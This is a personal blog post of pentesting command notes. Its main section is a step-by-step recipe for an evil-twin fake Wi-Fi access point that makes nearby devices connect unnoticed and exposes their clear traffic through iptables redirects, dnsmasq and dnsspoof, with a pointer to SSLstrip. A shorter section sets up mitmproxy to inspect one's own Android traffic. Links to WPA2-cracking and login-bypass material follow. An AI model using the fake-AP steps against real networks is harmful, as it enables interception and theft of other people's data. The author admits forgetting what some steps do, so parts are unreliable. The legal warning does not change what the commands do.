Title: Hacking
Date: 2016-01-18 23:00
Category: Linux
Tags: hacking, kali, security, android, mitm, linux
Slug: hacking
Authors: Romain Pellerin
Summary: A handful of useful commands about hacking

This brief article solely contains a few lines of commands, to perform pentesting or network monitoring. It's basically something I might use in the future on my networks or apps, so I'm writing it down as a reminder. I thought it may help other people that's why I decided to put it online. Of course the preferred operating system is [Kali](https://www.kali.org/) (or any Debian-based distro).

**WARNING: only for use on your own networks and devices, the law strictly forbids it otherwise.**

# Fake AP (access point)

This technique is about creating a fake access point, similar to one already existing, so that people's computers will try to connect to your fake AP automatically, without them noticing.

1. Deactivate any firewall first
2. Get super user rights

        :::bash
        sudo su

3. Install some required packages if not already present

        :::bash
        aptitude install dnsmasq aircrack-ng

4. List the existing network interfaces and turn one of them into monitor mode

        :::bash
        airmon-ng
        airmon-ng start wlan0 # wlan0 is usually Wifi

5. Start monitoring available networks around, and make a quick test

        :::bash
        airodump-ng mon0
        aireplay-ng --test mon0 # Test

6. Choose one network and fake it

        :::bash
        airbase-ng --essid 'HG655D-1BFF19' -c 7 -W 1 -Z 2 -v mon0 # Fake WPA AP

7. Enable packet forwarding

        :::bash
        echo 1 > /proc/sys/net/ipv4/ip_forward
        iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
        iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080

8. Write what follows in `/etc/dnsmasq.conf`:

        :::text
        interface=at0
        dhcp-range=192.168.0.50,192.168.0.150,12h

9. Do some other things for which I can't recall the usefulness right now (but I promise to update the article as soon as I do):

        :::bash
        ifconfig at0 192.168.0.1 up
        dnsmasq # pkill dnsmasq if needed

10. Write what follows in `/tmp/tests.conf` (`<tab>` means you have to hit the tab key):

        :::bash
        192.168.0.1<tab>*

11. Run `dnsspoof`:

        :::bash
        dnsspoof -i wlan0 -f /tmp/tests.conf

12. Finally, start a webserver (Apache or using Python, or whatever)

        :::bash
        python3 -m http.server 8080


And you're good! All the clear traffic will pop up right in front of your eyes. To deal with HTTPS connections, have a look at [SSLstrip](http://www.thoughtcrime.org/software/sslstrip/).

Encountering problems with DNSspoof? [Have a look there.](https://forums.hak5.org/index.php?/topic/29166-dnsspoof-problem/)

[More information about faking APs.](http://www.backtrack-linux.org/forums/showthread.php?t=61240)

[Another interesting tutorial ("Kali Linux Evil Wireless Access Point").](https://www.offensive-security.com/kali-linux/kali-linux-evil-wireless-access-point/)

# MITM

This is a commonly used technique to "put yourself" between a target user and an access point, in order to see all the traffic this user might send and receive.

## MITM on Android

On Android, it has the advantage of allowing you to monitor your outcoming traffic, which is useful when debugging your own apps.

1. Grant yourself super user rights and enable packet forwarding on the right interface (here `eth0` which is the Ethernet connection):

        :::bash
        sudo su
        sysctl -w net.ipv4.ip_forward=1
        iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 80 -j REDIRECT --to-port 8080
        iptables -t nat -A PREROUTING -i eth0 -p tcp --dport 443 -j REDIRECT --to-port 8080

3. Install the required dependencies and mitmproxy:

        :::bash
        apt-get install python-pip python-dev libffi-dev libssl-dev libxml2-dev libxslt1-dev libjpeg8-dev zlib1g-dev
        easy_install mitmproxy

    You can as well [download mitmproxy and install it manually](http://docs.mitmproxy.org/en/stable/install.html#installation-on-ubuntu).


4. Run it:

        :::bash
        mitmproxy -T --no-upstream-cert --host [-p 8080] # -p is optional as 8080 is the default port

    The argument `-T` is for *transparent*. If you don't go for transparent, then the 3 lines about packet forwarding (point 1.) are useless (or maybe not, I can't remember).

5. On your Android device:
    1. Open the current Wifi settings (long-press on the connected network).
        * If you decided to do transparent proxying (see above), set proxy to your computer's IP and port 8080, like: `192.168.1.2:8080`
        * If you decided not to do transparent proxying (see above), don't set the proxy and instead set the IP to be static rather than using DHCP. Then write your computer's IP as the gateway.
    2. Go to the website [mitm.it](mitm.it) and click on the Android icon to install the certificate. If this doesn't work (website unreachable), push the certificate manually from your computer (run the following command from your computer):

            ::bash
            adb push ~/.mitmproxy/mitmproxy-ca-cert.cer /sdcard/Download

Then you'll see the traffic in your terminal going through!

This part has been inspired from [this article](https://medium.com/@rotxed/how-to-debug-http-s-traffic-on-android-7fbe5d2a34).

# Other tools

- [mitmAP - A python program, to create a fake AP, and sniff data](https://github.com/xdavidhu/mitmAP)

# Other related topics

- [How to: Reset user password in Windows 7/8/8.1](http://www.gvrachliotis.net/2013/10/how-to-reset-user-password-in-windows.html)
- [Les dénies de services](https://www.nolimitsecu.fr/les-denis-de-service/)
- [Wifi ouvert – Attention aux faux hotspot ! (+ une démo avec un module Arduino)](http://korben.info/wifi-ouvert-attention-aux-faux-hotspot-demo-module-arduino.html)
- [How I Cracked a Keylogger and Ended Up in Someone's Inbox](https://www.trustwave.com/Resources/SpiderLabs-Blog/How-I-Cracked-a-Keylogger-and-Ended-Up-in-Someone-s-Inbox/)
- [Stalking your Facebook friends on Tinder](https://defaultnamehere.tumblr.com/post/147747146865/stalking-your-facebook-friends-on-tinder)
- [Professionally Evil: This is NOT the Wireless Access Point You are Looking For](https://blog.secureideas.com/2013/05/professionally-evil-this-is-not.html)
- [Phreaklets: Cracking WPA2 Enterprise wireless networks with FreeRADIUS WPE, hostapd and asleap & John the Ripper](http://phreaklets.blogspot.kr/2013/06/cracking-wireless-networks-protected.html?m=1)
- [TP Mobilité et réseaux sans fil : réseau sans fil sécurisé et monitoré + mobilité IPv6](http://www.guiguishow.info/2016/10/12/tp-mobilite-et-reseaux-sans-fil-reseau-sans-fil-securise-et-monitore-mobilite-ipv6/)
- [Learn from your attackers – SSH HoneyPot](https://www.robertputt.co.uk/2016/11/28/learn-from-your-attackers-ssh-honeypot/)
- [Alexsey’s TTPs](https://medium.com/@chrismcnab/alexseys-ttps-1204d9050551)
- [KON-BOOT](http://www.piotrbania.com/all/kon-boot/)
- [Rickroller Spotify !](https://korben.info/rickroller-spotify.html)
